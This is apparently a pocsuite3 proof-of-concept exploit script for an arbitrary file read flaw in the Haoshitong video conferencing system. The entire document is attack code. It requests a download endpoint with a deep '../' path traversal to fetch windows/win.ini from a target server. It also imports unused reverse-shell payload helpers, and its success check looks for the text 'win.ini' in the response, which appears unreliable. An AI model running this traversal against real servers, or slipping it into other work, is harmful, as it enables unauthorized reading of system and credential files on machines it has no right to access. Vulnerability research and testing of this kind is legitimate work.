# _*_ coding:utf-8 _*_
# @Time : 2023/12/10
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class haoshitong_fileread(POCBase):
    pocDesc = '''好视通视频会议任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-10'
    name = '好视通视频会议任意文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini'
        #check_path = self.url+ "/test.aspx"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "Content-Length": "0"
        }
        #path = "/Tools/Video/VideoCover.aspx"
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'win.ini' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(haoshitong_fileread)